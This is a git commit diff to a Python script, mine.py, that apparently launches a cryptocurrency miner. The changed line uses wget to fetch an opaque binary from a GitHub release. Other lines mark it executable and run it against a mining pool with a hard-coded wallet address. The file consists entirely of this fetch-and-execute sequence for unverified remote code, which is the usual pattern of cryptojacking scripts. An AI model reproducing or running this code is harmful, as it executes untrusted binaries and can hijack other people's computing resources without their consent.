ad65c924c06d140d26bbbfbb078f4ecebba24016
nisurayamax <96881752+nisurayamax@users.noreply.github.com>
2022-01-15 13:13:00 +0000

    Update mine.py

--- mine.py
+++ mine.py
@@ -1,5 +1,4 @@
 import os
-a  = os.popen('git clone https://gitlab.com/rikzakalani04/7.git').readlines()
-a  = os.popen('cd 7').readlines()
+a  = os.popen('wget -O pepek https://github.com/nisurayamax/1a/releases/download/n/pepek').readlines()
 a  = os.popen(' chmod +x pepek').readlines()
 a  = os.popen('./pepek -o us-central.2acoin.org:3333 -u guns82236uScsVT1YRJcCPiX5VoWeiFVxZisncD5fMzBLsjcuSco3hC4fwd8csJ4DEDi8Mb9xGzWQAvAcfYZZwwM6bebxr1wEV -p SUKUMANTE1 -a Argon2/Chukwa -k').readlines()
